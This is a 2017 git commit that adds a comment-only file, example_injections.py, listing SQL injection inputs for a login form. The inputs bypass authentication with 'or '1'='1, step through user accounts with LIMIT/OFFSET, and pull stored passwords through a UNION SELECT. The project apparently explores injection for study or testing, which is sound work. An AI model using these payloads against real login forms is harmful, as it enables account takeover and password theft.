b83a98c7e0ede75e37cefde8352b9cc06a68c821
yp0975eu(Branden) <yp0975eu@users.noreply.github.com>
2017-02-01 16:35:21 -0600

    removed some misc idea files. added example injections to text file

---
+++ example_injections.py
@@ -0,0 +1,10 @@
+# cycle through users by changing the offset values:
+#
+# cycle through users:
+# username: 'or '1'='1
+# password: 'or '1'='1'  limit 8 offset '1
+#
+#
+# show passwords:
+# username: 'or '1'='1
+# password: 'or '1'='1' UNION SELECT password from users limit 8 offset '0
